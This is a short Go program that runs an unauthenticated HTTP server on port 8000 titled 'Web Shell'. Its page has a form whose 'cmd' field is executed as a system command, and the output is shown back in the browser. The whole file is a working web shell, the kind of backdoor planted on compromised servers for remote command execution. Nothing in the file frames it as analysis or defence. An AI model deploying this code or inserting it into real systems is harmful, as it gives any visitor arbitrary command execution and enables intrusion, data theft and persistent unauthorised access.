package main

import (
	"io"
	"net/http"
	"log"
	"os/exec"
	"strings"
)

var com string
var com_tail string
var commandResp string

// func hello(w http.ResponseWriter, r *http.Request) {
// 	io.WriteString(w, com + com_tail)
// 	params := r.URL.String()

// 	if params != "/" {

// 		log.Println(strings.Split(params[2:], "&"))
		
// 	}
// }

// func first(w http.ResponseWriter, r *http.Request) {
// 	io.WriteString(w, "First page!")
// }

func getPost(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()

	if r.Method == "GET" {
		log.Println("GET")
		io.WriteString(w, com + com_tail)
	} else if r.Method == "POST" {
		log.Println("POST")

		output := execCommand(r.FormValue("cmd"))

		commandResp = "<br/><b>" + r.FormValue("cmd") + "</b><br/>" + output + "<br/><br/>" + commandResp

		io.WriteString(w, com + commandResp + com_tail)
	}
}

func execCommand(cmd string) string {

	args := strings.Split(cmd, " ")

	out, err := exec.Command( args[0], args[1:]... ).Output()

	if err != nil {
		log.Println(cmd + " not found");
		log.Println(err)
		return cmd + " not found"
	}

	log.Println(string(out))

	return strings.Join(strings.Split(string(out), "\n"), "<br/>")
}

func main() {
	com = `
	
<!DOCTYPE html>
<html>
<head>
	<title>Web Shell</title>
</head>
<body>

	<center>
		<h1>
			Web shell
		</h1>
	</center>
	
	<div style="width: 100%;">
		<div style="float:left; width: 49%">

			<p>
				Enter here your commands. Remember to use the full path (eg: /bin/ls):
			</p>

			<p>
				<form method="post">
					$: <input type="text" name="cmd"></input>
				</form>
			</p>
	`

	com_tail = `

		</div>

		<div style="float:right; width: 49%">
			<img src="https://s-media-cache-ak0.pinimg.com/736x/77/90/3b/77903bc1264c3cb6a54d233a58ef72fc.jpg" style="width:100%;">
		</div>

	</div>

	<div style="clear:both">
		
	</div>

</body>
</html>
`
	commandResp = ""
	http.HandleFunc("/", getPost)

	http.ListenAndServe(":8000", nil)
}